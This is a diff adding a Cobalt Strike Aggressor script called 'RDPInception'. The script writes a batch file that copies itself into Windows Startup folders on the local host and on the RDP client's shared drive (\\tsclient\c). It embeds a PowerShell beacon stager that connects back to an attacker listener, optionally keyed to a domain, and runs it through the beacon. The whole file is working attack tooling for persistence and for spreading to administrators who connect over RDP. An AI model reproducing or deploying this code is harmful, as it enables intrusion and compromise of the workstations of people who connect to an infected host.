@@ -1,0 +1,68 @@
+# RDPInception
+#
+# Written by Vincent Yiu @vysecurity
+
+
+alias rdpinception {
+	rdpincept($1,$2);
+}
+
+sub rdpincept {
+   	$beacon = $1;
+   	$domain = $2;
+   	# Force select a payload
+    openPayloadHelper(lambda({
+        $listener = $1;
+        blog($beacon, "RDPIncepting listener: $listener");
+        $buffer = "@echo off\r\n";
+
+		$buffer = $buffer . "timeout 1 >nul 2>&1\r\n";
+
+		$buffer = $buffer . "mkdir \\\\tsclient\\c\\temp >nul 2>&1\r\n";
+		$buffer = $buffer . "mkdir C:\\temp >nul 2>&1\r\n";
+
+		$buffer = $buffer . "copy run.bat C:\\temp >nul 2>&1\r\n";
+		$buffer = $buffer . "copy run.bat \\\\tsclient\\c\\temp >nul 2>&1\r\n";
+
+		$buffer = $buffer . "del /q %TEMP%\\temp_00.txt >nul 2>&1\r\n";
+
+		$buffer = $buffer . "set dirs=dir /a:d /b /s C:\\users\\*Startup*\r\n";
+		$buffer = $buffer . "set dirs2=dir /a:d /b /s \\\\tsclient\\c\\users\\*startup*\r\n";
+
+		$buffer = $buffer . "echo|%dirs%|findstr /i \"Microsoft\\Windows\\Start Menu\\Programs\\Startup\">>\"%TEMP%\\temp_00.txt\"\r\n";
+		$buffer = $buffer . "echo|%dirs2%|findstr /i \"Microsoft\\Windows\\Start Menu\\Programs\\Startup\">>\"%TEMP%\\temp_00.txt\"\r\n";
+
+		$buffer = $buffer . "for /F \"tokens=*\" %%a in (%TEMP%\\temp_00.txt) DO (\r\n";
+		$buffer = $buffer . "	copy run.bat \"%%a\" >nul 2>&1\r\n";
+		$buffer = $buffer . "	copy C:\\temp\\run.bat \"%%a\" >nul 2>&1\r\n";
+		$buffer = $buffer . "	copy \\\\tsclient\\c\\temp\\run.bat \"%%a\" >nul 2>&1\r\n";
+		$buffer = $buffer . ")\r\n";
+
+		$buffer = $buffer . "del /q %TEMP%\\temp_00.txt >nul 2>&1\r\n";
+
+		# Keying by Domain
+
+		if ($domain){
+			$buffer = $buffer . "If \"" . $domain . "\"==\"%USERDOMAIN%\" (";
+        	$buffer = $buffer . powershell($listener, false) . ")";
+        }
+        else{
+        	$buffer = $buffer . powershell($listener, false);
+        }
+
+        blog($beacon, $buffer);
+        
+       	blog($beacon, "Infecting machine with RDPInception.");
+       	bmkdir($beacon, "C:\\temp");
+       	bupload_raw($beacon, "C:\\temp\\run.bat", $buffer);
+
+       	blog($beacon, "Executing RDPInception from C:\\temp\\run.bat");
+       	bshell($beacon, "C:\\temp\\run.bat");
+
+    }, $bids => $1));
+ 
+}
+
+beacon_command_register("rdpinception", "Infects the machine with RDPInception",
+	"Synopsis: rdpinception [DOMAIN Key]\n\n" .
+	"Infects the machine with RDPInception, a HTTP, HTTPS or DNS payload that can egress is recommended.");
